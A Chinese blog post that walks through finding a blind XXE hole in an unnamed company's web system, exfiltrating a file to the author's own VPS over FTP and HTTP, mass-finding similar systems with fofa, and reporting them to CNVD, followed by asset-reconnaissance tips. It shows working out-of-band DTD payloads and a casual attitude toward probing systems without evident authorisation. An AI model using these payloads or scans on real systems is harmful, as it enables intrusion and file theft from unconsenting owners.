漏洞一 XML实体注入  通用型

早上瞎溜达的时候，发现了一个某个公司的系统，那就常规测试，抓数据。

常规抓包，发现使用的是XML提交方式，好久没见到了，刚好试试XXE漏洞。
先打一发试试看，看看有没有反应。

很舒服的是，有反应。

我们继续试试，看看能不能直接读到敏感信息。

很可惜，无回显。(这里虽然读的是etc，但是网站系统是windows，我改了，不过照样无回显，只不过windows那个图没了，就没有换)


不过我们可以简单梳理一下：利用DNSLog方法，我们提交如上的Payload，如果目标网站存在XXE漏洞的话，就会请求我们指定的地址，当然就会去解析该地址，我们的DNS平台上就会有相应的解析记录。最后重放发现，返回包提示内部错误，并且我们的DNS平台也收到了数据，说明这个网站是存在XXE。
既然存在，但是无回显，那么我们就用Blind XXE方法了。


方法一：FTP读取（失败，不过也是一个好方法）
第一步：在VPS上创建一个dtd文件，文件内容如下，然后放在www目录下。

<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'ftp://vps的地址:2121/%file;'>">%all;




然后我们再运行xxe-ftp-server.rb文件，用来监听2121端口。

xxe-ftp-server项目地址：https://github.com/ONsec-Lab/scripts

成功开启监听


第二步：我们在burp提交数据

然后我们返回服务器端查看2121端口监听返回的数据。
虽然是有数据回显，但是情况不尽人意

所以我们这里就不使用ftp了，使用http。


方法二(HTTP读取)
第一步：我们先在VPS上开启apache服务
在其目录下新建一个eval.dtd文件。
内容如下

<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://你的VPS的ip/?content=%file;'>"> %payload;




第二步：开启监控apache的访问日志


第三步：构建xml，在burp上发包

<?xml version="1.0"?><!DOCTYPE test[<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"> <!ENTITY % dtd SYSTEM "http://你的vps的ip/evil.xml"> %dtd;%send;]>



我们在日志监控中就可以看到带出来的信息


url解码一下就可以很明显的看出来了。

读取成功。
收获一个XXE，简单猜测，应该是个通用系统。
找同一个就比较简单了，例如同样的路径地址，同样的ico，同样的js文件，body中同样的字符等等，都可以成为搜索条件。

这里我也是直接利用fofa，找到了一些同类，复现3，案例10，搞完交CNVD了。


不过我同样的条件我去360测绘搜索的时候，发现的资产更多，虽然有些不属于，但是渗透测试就是这样，宁可错杀一千，也不放一个，说不定又挖到其他系统的呢。

总结

测试到这里其实也就差不多结束了，因为实在是累了，我写到这里的时候已经凌晨4:50了，具体技术说实话没有，只是运气好罢了。但是还是要简单总结一下资产收集的思路。
1.得到一个站点，挖到漏洞，就找同类，争取通用，如何找，fofa可以直接搜js路径，搜ico,搜系统名称body=，title=等等。
2.一个系统搞完，找厂商，找到之后主要看几个地方，第一个利用爱企查看公司的知识产权区域。


(1)网站备案区:主要是公司自己的网站，对于一些信息技术类公司，一般都会放自己公司的一些热门产品或者测试演示站点；
(2)商标信息区：一般都是公司旗下产品的一些logo和商标名称,有了这些信息我们就可以对根据这些商标及其商标名称去更多的寻找属于这家企业资产及其产品。

(3)对于专利这一块，我相信是各位看的最多的地方，因为一个企业想要保护自己的产品，就会去申请专利保护，而对于我们来说，也是寻找信息的好地方。

通过搜索软件名称和软件简称，同样可以大大扩展我们的资产面。
(4)企业品牌项目，这个模块算是记录了企业的核心产品，我们一般可以直接fofa搜app="品牌项目名"，可以直接并精准的挖掘到企业产品。
第一个说完了就简单说完了。
接着说说第二个，看企业官网。
同样看几个地方，首先官网的首页，看看他正在出售或者热门的一些产品
例如这种，通过官网展示的商品继续在空间搜索引擎和浏览器这些上搞。其次看什么，看经典案例，一般网站都会放和哪些企业有合作，合作了什么项目，使用的我们的什么系统产品等等，这个就是我们收集通用的好地方，可以以这些合作案例的用户作为搜索对象，以此查询该公司的一些系统。

再此外我经常会看的一个东西，就是网站的一些图片，例如这个
它的图片来源一般就是公司自己的一些系统，我们可以以这些图片的一些文字信息作为搜索条件，查找公司资产。
3.资产这时候收集的差不多了吧，到了正常渗透流程，不妨多抓抓包，再看看网站的js信息，很多网站的js中就存在许多的敏感信息。这里推荐一个小插件->FindSomething,使用起来非常不错。



4.此外在渗透中，前台Xss的时候一定要想办法进入后台测试，在发现支付类逻辑的时候就多想多测就完了，可以看我之前总结的一片逻辑支付漏洞小合集。支付逻辑漏洞思路小集合
最后再补充一点，多空间搜索引擎交替使用，在我测试的时候360的空间测绘搜索出来的资产是最多的，而且通过icon找到也比较准。所以这里推荐使用一下。(当然fofa和zoomeye都是ok的。)
